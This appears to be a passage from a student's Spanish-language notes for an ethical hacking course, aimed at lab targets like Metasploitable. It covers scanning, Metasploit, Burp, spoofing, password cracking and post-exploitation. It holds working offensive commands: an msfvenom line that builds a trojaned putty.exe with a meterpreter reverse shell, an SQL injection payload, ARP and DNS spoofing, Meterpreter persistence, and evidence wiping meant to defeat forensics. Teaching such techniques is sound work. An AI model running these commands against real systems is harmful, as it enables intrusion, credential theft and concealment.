- `--script` -> Nos permite usar los scripts que tiene Nmap.

#### -sS
- `-sS "IP"` -> Va a escanear todos los puertos y va a mostrar cuáles están abiertos.
- `-sS "IP" -p "Puerto"` -> Va a centrarse en el puerto que le indiquemos.

#### -PS
- `-PS"Puertos por los cuales va a probar la conexión" "IP"`
- `-PS "IP" -p "Puertos a los cuales va a escanear para comprobar si están abiertos"`

### Ejemplos
- `-sn 192.168.157.0/24`
- `-PS 192.168.157.128 -p 80`
- `-PS21,22,23,24 192.168.157.128 -p 21`
- `-PS21,22,23,24 192.168.157.0/24 -p 21`
- `sudo nmap -v --reason -sS -oX puertos.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl"  192.168.157.125-135`
- `sudo nmap -sS 192.168.157.125-135`
- `sudo nmap -sS 192.168.157.0/24`
- `sudo nmap -sS 192.168.157.128 -p 80`
- `sudo nmap -v --reason -sV -oX servicios.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl"  192.168.157.125-135`
- `sudo nmap -v -O 192.168.157.128`
- `sudo nmap -v -sS -p 139,445 192.168.157.129`
- `sudo nmap -v -sS -p 139,445 --script=smb-os-discovery 192.168.157.129`
- `sudo nmap -v -sU -p 161 --script=snmp-win32-software 192.168.157.129`
- `sudo nmap -v -sU -p 161 --script=snmp-win32-users 192.168.157.129`
- `sudo nmap -v -sU -p 161 --script=snmp-processes 192.168.157.129`
- `sudo nmap -v -sU -p 161 --script=snmp-netstat 192.168.157.129`

# Fin de la recopilación activa de información

# Clase teórico práctica día 17 01/10/2024

## Análisis de vulnerabilidades    
- Esta fase consiste en la identificación de fallos de seguridad que se encuentran presentes en los sistemas que se están evaluando.
- El tipo de fallos abarca desde errores en la configuración de un servicio hasta vulnerabilidades en determinados servicios que sean públicos y puedan comprometer la integridad del mismo.

#### Links y ayudas
- [CVE Mitre](https://cve.mitre.org/cve/search_cve_list.html)
- [NVD NIST](https://nvd.nist.gov/vuln/search/)
- [CVE Details](https://www.cvedetails.com/vulnerability-search.php)

### CVE, CVSS, CPE - Common Vulnerabilities and Exposures
- En esta clase vimos cómo buscar y clasificar de manera sencilla las vulnerabilidades que habíamos encontrado anteriormente con las recopilaciones de información, con diferentes sitios web que tienen repositorios sobre dichas vulnerabilidades, su nivel de complejidad y nos podrían ayudar a encontrar exploits que nos ayuden a explotarlas.

# Clase práctica día 18 02/10/2024

### Análisis de vulnerabilidades con Nmap
- Con uno de los scripts de Nmap podemos realizar un análisis de vulnerabilidades, en concreto con el `--script=vuln`. También, con sus herramientas, nos permite exportarlo a un archivo XML para visualizarlo de una mejor manera. Al encontrar vulnerabilidades, podremos visualizar algunas de ellas por medio de un navegador. También se encargará de usar comandos en caso de encontrar vulnerabilidades en dicho aspecto.

# Clase práctica día 19 03/10/2024

# Clase práctica día 20 07/10/2024

### Nessus
- Nessus es la aplicación de análisis de vulnerabilidades más usada en el mundo. La mayoría de sus versiones son de paga, así que nosotros accedimos a la gratuita, que está limitada, pero nos va a servir para probar la app. Nos permite crear políticas con las cuales podemos crear análisis personalizados. También nos permite crear reportes respecto al análisis que hayamos realizado.
- Vimos los 2 tipos de análisis avanzados que tiene Nessus: el `advanced scan` y el `advanced scan dynamic`. El dinámico nos permite personalizar los plugins que se van a usar durante dicho análisis, y el avanzado es también personalizable pero ya viene con todos los plugins habilitados de base.

# Fin del análisis de vulnerabilidades

# Clase teórico práctica día 21 08/10/2024

## Explotación de vulnerabilidades
- Esta fase consiste en el uso de técnicas que permiten al analista aprovechar una vulnerabilidad identificada para obtener algún beneficio desde el punto de vista del ejercicio de hacking ético.
- Se corresponde con una de las fases más importantes e intrusivas del proceso de hacking ético.
- Deben tenerse muy en cuenta las herramientas de protección y detección que utiliza la organización, entre las que se encuentran: antivirus, EDR, IPS, IDS, HIDS, WAF...

- En función del componente tecnológico en el que se encuentra la vulnerabilidad, vamos a dividir las fases de explotación en:
  - Explotación de vulnerabilidades en host
  - Explotación de vulnerabilidades en aplicaciones web
  - Explotación de vulnerabilidades en red

## Explotación de vulnerabilidades en host

### Explotación de vulnerabilidades de forma manual
- Con la información que hayamos obtenido en el análisis de vulnerabilidades, podremos usar distintos tipos de exploits que nos ayudarán a explotar dichas vulnerabilidades. Podemos buscar exploits por Internet, teniendo precaución ya que pueden ser virus. Dichos exploits nos permitirán explotar de distintas formas las vulnerabilidades que hayamos encontrado en dicho escaneo.
- En la clase de hoy vimos cómo explotarlas de manera manual, modificando el código o dicho exploit con Emacs. También usamos Netcat para escuchar y poder conocer la información que nos está enviando dicha máquina gracias al exploit.
- El exploit que usamos fue uno enfocado en tomar el control del objetivo. Lo buscamos en línea, lo modificamos y seguimos las instrucciones para que funcionara de manera correcta. Así pudimos obtener acceso a nuestra máquina local Metasploitable Ubuntu e incluso ver algunos ficheros que tiene dicha máquina.

## Clase práctica día 22 09/10/2024

# Clase práctica día 23 10/10/2024

# Clase práctica día 25 16/10/2024

## Metasploit
- **Metasploit** es una herramienta/Framework que tiene implementado un conjunto de exploits para todas las vulnerabilidades que van saliendo. También se le puede implementar un módulo y lo almacenará de forma automática.
  - Tiene herramientas auxiliares que permiten realizar toda la fase de lanzamiento del exploit, manejo de la conexión, herramientas de post-explotación. Es un entorno completo que facilita la creación de exploits, el uso de diferentes payloads, recibir la conexión, manejarla, etc.
  - Metasploit se fundamenta en el concepto de módulo; cada uno de los exploits se corresponde con un módulo. La unidad básica de Metasploit son los módulos, también tiene plugins, scripts, bases de datos y librerías.
  - Nos permite juntar payloads con exploits. Metasploit usa el lenguaje de programación Ruby.

### Información importante sobre Metasploit
- **Funcionamiento**: Al buscar un exploit específico, podremos observar si dicho exploit tiene una funcionalidad buena, excelente, mala o manual. Es importante tener en cuenta esta información al usarlo. Si el exploit tiene una calificación excelente, no habrá mayor problema al ejecutarlo, pero si tiene una calificación manual, como en el caso del exploit *windows/rdp/cve_2019_0708_bluekeep_rce*, tendremos que modificar el exploit para que funcione correctamente.
- **Opciones**: Hay que tener muy en cuenta las opciones o los requerimientos que nos pide el exploit para poder ejecutarse. Estos se pueden ver con el comando `show options`. Ahí podremos ver todas las opciones del programa y modificarlas, como `rhost`, `lhost`, `lport`, `rport`, etc. Todas las opciones requeridas para el funcionamiento del exploit tendrán un "yes", lo que nos indica cuáles debemos modificar o agregar obligatoriamente para su correcto funcionamiento.
- **Modificación de los exploits**: Para modificar el exploit *exploit/windows/cve_2019_0708_bluekeep_rce*, que al lanzarlo contra el objetivo Metasploitable Windows, crasheaba el sistema operativo porque trataba de obtener una parte de la memoria inaccesible, tuvimos que acceder al exploit y modificarlo con `emacs`. Necesitamos modificar la parte del área de trabajo más parecida al de nuestro objetivo. Usamos el programa `vmss2core` desde nuestro equipo host y un depurador como `windbg`. Usamos ficheros de VMware, que modificamos desde el CMD de Windows para realizar un volcado de memoria y así encontrar la parte de la memoria que sí está paginando. Con la dirección obtenida, usamos `emacs` desde Kali Linux para modificar la memoria y poner la parte que sí está paginando.
- **Payloads**: No todos los exploits dependen de un payload para su funcionamiento. Algunos exploits, como *use exploit/windows/cve_2019_0708_bluekeep_rce*, no requieren un payload, mientras que otros sí dependen de uno.
  - **Singles**: Payloads autocontenidos y autosuficientes que no necesitan de Metasploit para funcionar. Por ejemplo, si tenemos un payload que nos devuelve una conexión, podemos recibirla con cualquier herramienta.
  - **Stagers**: Payloads pequeños para tareas específicas que nos permiten establecer una conexión con una máquina, nos devuelven una conexión reversa y descargan o aprovechan algún payload de tipo "stages" para realizar alguna acción. (Depende mucho más de Metasploit).
  - **Stages**: Payloads que realizan acciones mucho más avanzadas, como inyectar una DLL en un proceso o devolver una shell encriptada. (Depende mucho más de Metasploit).

### Importación de datos de Nessus
- Podemos importar los datos de Nessus de manera sencilla, tanto desde Nessus exportando el archivo y descargándolo, como desde Metasploit conectándonos a Nessus y usando plugins. Esto nos ayuda a tener los datos más a la mano y hace más versátil el hacking ético.

### Comandos de Metasploit
- `search`: Permite buscar un exploit para una vulnerabilidad que hayamos encontrado. También permite buscar auxiliares y payloads.
- `use`: Permite usar uno de los exploits que tenga Metasploit.
- `back`: Retrocede o cancela una acción.
- `show options`: Muestra las opciones necesarias para que el exploit funcione.
- `show advanced`: Muestra opciones más avanzadas de un exploit.
- `set`: Permite modificar una de las opciones del exploit.
- `exploit`: Ejecuta el exploit.
- `show payloads`: Muestra todos los payloads compatibles con el exploit.
- `sessions`: Muestra las sesiones activas.
- `msfconsole`: Accede a la consola de Metasploit.
- `db_import`: Permite importar archivos a Metasploit.
- `host`: Muestra la base de datos de Metasploit.
- `services`: Muestra los servicios abiertos de un host luego de importar un archivo de Nessus.
- `vulns`: Muestra vulnerabilidades de un host del cual hayamos importado el archivo de Nessus.
- `load`: Permite cargar los plugins.

### Ejemplos de comandos de Metasploit
- `set rhost 192.168.157.128`
- `set lhost 192.168.157.130`
- `use unix/irc/unreal_ircd_3281_backdoor`
- `show payloads`
- `set payload cmd/unix/generic`
- `set payload cmd/unix/reverse`
- `exploit`
- `use exploit/windows/cve_2019_0708_bluekeep_rce`

### Comandos importantes dentro de la máquina
- `/etc/passwd`: Muestra los usuarios e información importante.
# Clase práctica día 24 15/10/2024

## Msfvenom
- Es un generador de payloads. Ya no tendremos que usar la consola de metasploit, podremos usar msfvenom para así generar un único payload, y poder usarlo nosotros con un exploit traído de internet o que nosotros hayamos creado.
- También nos puede ayudar a crear backdoors en binarios, o código malicioso escondido dentro de aplicaciones, sin que pierdan su funcionalidad.

#### Comandos msfvenom
- `-p` -> Nos permite generar los payloads.

### Información importante Msfvenom
- **Generación de payloads**: Para generar un payload, tendremos que saber cuál va a ser el payload que necesitamos generar, dependiendo de la vulnerabilidad y lo que necesitemos. En esta clase generamos un payload que nos genera una conexión reversa a través de una shell.
  - En este caso con este comando:
    ```bash
    msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.157.130 lport=4445 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
    ```
    Crearemos una copia del `.exe` putty y le cambiaremos el nombre a puttyX para no confundirnos de cuál tiene el troyano y cuál es el original. También podremos observar que este no perderá su funcionalidad y podrá seguir funcionando sin problema.

# Clase práctica día 25 22/10/2024

# Clase práctica día 26 23/10/2024

# Clase práctica día 27 24/10/2024

## Burpsuite
- Es la herramienta más usada para buscar vulnerabilidades en sitios web. Es un proxy de interceptación, se va a localizar entre el servidor web y nuestro internet. Tendremos que modificar nuestro navegador para su correcto funcionamiento. Puede parar las peticiones que le hagamos a un servidor web. Al tener encendida la interceptación, Burpsuite también puede descubrir apartados de los sitios web, analiza el código fuente del servidor, coge todos los enlaces y nos los muestra a nosotros. También se conoce como spidering o crawling pasivo.

### Inyección de código y contexto
- Podemos modificar el código fuente de las aplicaciones web por medio de puntos de inyección. Los puntos de inyección son todos aquellos puntos donde permite el sitio web interactuar al usuario. Con Burpsuite podemos hacer la modificación al interceptar las respuestas del servidor y cambiando el parámetro que necesitemos.

### Comandos
- `' or 1=1--` -> Nos devuelve todo de la base de datos que esté consultando en ese momento.

## Skipfish
- Para el spidering y el crawling activo usaremos esta herramienta. Lo que hace es buscar absolutamente todos los apartados de la web objetivo. Para usarlo en Kali Linux ya viene instalado. Usaremos los comandos que más se nos ajusten a nuestras necesidades. En nuestro caso `-Y` y `-o`. Tendremos que crear un directorio en donde se guardará toda la información que haya recopilado.

# Clase práctica día 28 28/10/2024

## SQLinjection
- Es la inyección de código mediante SQL. Al momento de una página realizar una consulta a una base de datos y estar mal parametrizada, podremos obtener datos de la base de datos.

## Web shells
- Es subir un archivo con un comando que nos permita obtener beneficios del objetivo web.

# Explotación de vulnerabilidades en red

## Man in the middle
- Se basa en tratar de interferir en todos los protocolos de la red para que cuando un nodo de nuestra red quiera enviar información a un nodo de otro router, vamos a suplantar el router del objetivo para que así nos envíe esa información a nosotros. Así el equipo objetivo no se dará cuenta que estamos en medio de la comunicación y estamos interceptando toda esa información para explotarla.

### Bettercap
- Es una herramienta que nos permite realizar ataques de red aprovechando las vulnerabilidades del mismo. Para usarlo tendremos que colocar un objetivo en la terminal de Bettercap con el comando `set "tipo de ataque".targets` y iniciar el ataque con un comando similar a `tipo de ataque` on. También, para ciertos ataques necesitaremos otros campos como `address`, que es la IP de nuestro objetivo.

#### Comandos
- `set` -> Nos permite colocar targets.
- `on` -> Nos permite encender el ataque que le indiquemos.
- `arp.spoof` -> Nos permite iniciar una suplantación por medio de ARP.
- `dns.spoof` -> Nos permite redirigir a nuestro objetivo hacia un dominio web nuestro.

#### Ejemplos
- `set arp.spoof.targets`
- `arp.spoof on`
- `set dns.spoof.domain`
- `set dns.spoof.address`

## ARP Spoofing
- Se refiere a suplantar la IP física de un objetivo para así interceptar toda la información que esta reciba por medio de la red. Usaremos Bettercap para enviar esta interceptación de datos y con Wireshark observaremos cómo funciona dicho ataque. Funciona enviando muchos paquetes de red al objetivo y así podremos observar cómo suplantamos la IP física del objetivo, teniendo que pasar toda la información por nosotros.

## DNS Spoofing
- Este ataque nos permite dirigir a nuestro objetivo hacia un sitio web que esté alojado en nuestra dirección IP para así poder obtener datos o información de nuestro interés, como contraseñas, información, etc.

## Social Engineering Toolkit
- Nos permite duplicar una página web como si fuera la original y así obtener credenciales de acceso.

## Manipulación de tráfico de red
- Se basa en modificar los paquetes de red originales que se están compartiendo entre los 2 nodos de la red.
### Pholymorph
 - Nos permite modificar los paquetes de red mientras se están enviando, lo que hace es capturar los paquetes de red, generando una plantilla para así ejecutar comandos de Python y modificar su contenido a nuestra conveniencia. También nos permite hacer spoofing, creando funciones con Python, las cuales se ejecutarán secuencialmente al momento de interceptar paquetes.
#### Comandos 
 - `spoof` - Permite realizar spoofing a la IP objetivo.
 - `-t` - La IP objetivo.
 - `-g` - Es el gateway.
 - `capture` - Polymorph se pone a capturar todos los paquetes que pasen por él.
 - `-f` - Nos permite colocar un filtro.
 - `show` - Nos muestra la información.
 - `wireshark` - Nos permite usar Wireshark para visualizar mejor los paquetes capturados.
 - `template` - Nos permite seleccionar el paquete que queramos.
 - `intercept` - Comienza a interceptar los paquetes.
 - `functions` - Nos permite añadir una función.
#### Ejemplos
 - `spoof -t "IP objetivo" -g "Gateway"`
 - `capture -f icmp`
 - `functions -a icmp-func -e emacs`

### Post explotación
 - La fase de post explotación es algo delicada, y se hace pocas veces, ya que los clientes no les interesa que indagues en su privacidad. Sin embargo, es importante ya que hay casos donde tendremos que usarla. Nos ayuda a evaluar el valor del activo que hemos comprometido, qué nos brinda, etc. Este valor es un recurso que puede determinarse por lo sensible que es la información que almacena o por la capacidad que puede proporcionar a un atacante para comprometer más recursos dentro de la organización.
 - A no ser que exista una petición expresa del cliente, no deben evaluarse ni modificarse aspectos críticos.
 - Las modificaciones y cambios en la configuración realizados en esta fase deben ser documentables y revertibles.
 - Se debe entregar una lista detallada de todas las acciones tomadas contra el sistema del cliente y el período de tiempo en el que se realizan.
 - Toda la información privada o personal que se descubra puede ser utilizada para ganar más privilegios u obtener información adicional solo si se tiene autorización expresa del cliente y del propietario de la información.
 - Las contraseñas no deben adjuntarse en el reporte final.
 - No establecer mecanismos de persistencia en una máquina sin el consentimiento expreso del cliente.
 - Toda la información recolectada durante la auditoría debe ser cifrada en los equipos de los analistas.
 - Toda la información recopilada debe ser destruida una vez que el cliente acepte el reporte final.

### Cracking de contraseñas
 - Las contraseñas, por motivos de seguridad, normalmente se pasan por el proceso de hash, el cual cambia completamente una cadena de texto mediante ciertos patrones y operaciones. Para intentar quitar ese hash o revertirlo, usaremos herramientas como John the Ripper y Hashcat.

### John the Ripper
 - Para usar John, tendremos que conocer el formato en el cual está la contraseña. Utiliza un diccionario de palabras para hashear y adivinar la contraseña correcta.
#### Comandos 
 - `--format` - Nos permite colocar el formato de contraseñas hasheadas.
 - `--worldlist` - Nos permite cambiar el diccionario que usa por defecto.
 - `--show` - Nos muestra las contraseñas que haya encontrado.
#### Ejemplos
 - `--format=raw-md5 --worldlist=/usr/share/worldlist/rockyou.txt hash.md5`
 - `--format=raw-md5 hash.md5 --show`
 - `--format=raw-sha256 hash.sha256`
 - `--format=raw-sha256 hash.sha256 --show`

### Hashcat
 - Es otro programa capaz de crackear contraseñas igual que John the Ripper, pero tiene ciertas diferencias. Al permitirnos seleccionar la técnica de ataque, podremos usar diferentes métodos, como fuerza bruta y otras técnicas.
#### Comandos 
 - `-m` - Nos permite colocar el formato en el cual están hasheadas las contraseñas.
 - `-a` - Nos permite seleccionar la técnica que queramos utilizar.
#### Ejemplos 
 - `hashcat -m 0 -a 0 hash.md5 /usr/share/worldlist/rockyou.txt`
 - `hashcat -m 0 -a 0 hash.md5 /usr/share/worldlist/rockyou.txt --show`
 - `hashcat -m 0 -a 3 hash.md5 /usr/share/worldlist/rockyou.txt`
 - `hashcat -m 0 -a 3 hash.md5 /usr/share/worldlist/rockyou.txt --show`
 - `hashcat -m 1400 -a 0 hash.sha256 /usr/share/worldlist/rockyou.txt`
 - `hashcat -m 1400 -a 0 hash.sha256 /usr/share/worldlist/rockyou.txt --show`

### Migración de Meterpreter a otro proceso
 - Lo que buscamos es mantener la conexión con nuestro objetivo incluso si este llega a cerrar el .exe por el que hemos entrado, para así mantener el control completo de nuestro objetivo. Con este comando `run /post/windows/manage/migrate` podremos migrar el proceso y cambiar así su PID.

### Borrado de evidencias
 - Se basa en borrar cualquier rastro que podamos haber dejado dentro del sistema operativo objetivo, para que si un forense llega a revisar el disco duro, no pueda encontrar nada que nos pueda incriminar.
#### En Linux
 - `shred` - Es la herramienta que nos enseñaron para Linux, esta herramienta incluso viene preinstalada en sistemas operativos Linux.
 - `srm` - Borra un fichero de manera segura, sobreescribe varias veces dicho archivo.
#### En Windows
 - `meterpreter` - Con el comando `run post/windows/manage/sdel File=c:\\users\\User\\Desktop\\Nombrearchivo` va a sobreescribir el archivo que hayamos seleccionado, eliminándolo de forma segura.

### Machine Learning en Hacking
 - La IA está transformando rápidamente la vida y los negocios, mejorando la forma en que diagnosticamos y tratamos las enfermedades, cultivamos nuestros alimentos, fabricamos y entregamos nuevos productos, administramos nuestras finanzas, alimentamos nuestros hogares y viajamos de un punto A a un punto B.
 - La IA también tiene importantes aplicaciones dentro del ámbito de la ciberseguridad, no solo en el ámbito defensivo, sino también en el ámbito ofensivo.
 - Uso de la IA para mejorar las técnicas defensivas que existen.
 - Seguridad de los sistemas basados en IA.
 - Uso de la IA para mejorar las técnicas de ataque que existen.
#### Batea
 - Nos permite seleccionar un escaneo de recopilación activa de información, y clasificar en base a un ranking de qué es más importante seguir investigando desde el punto de vista de hacking ético.

#### Pesidious
 - Lo que hace es "mutar" un troyano que hayamos creado para que este sea mucho más difícil de detectar.

### Ideas para la realización de Hacking ético - MITRE ATT&CK
 - [https://attack.mitre.org](https://attack.mitre.org)
 - Lo que han hecho es analizar un conjunto enorme de grupos de atacantes reales. Con ello, podremos seguir estrategias o seguir consejos de ellos, también nos permite planificar ataques de hacking ético.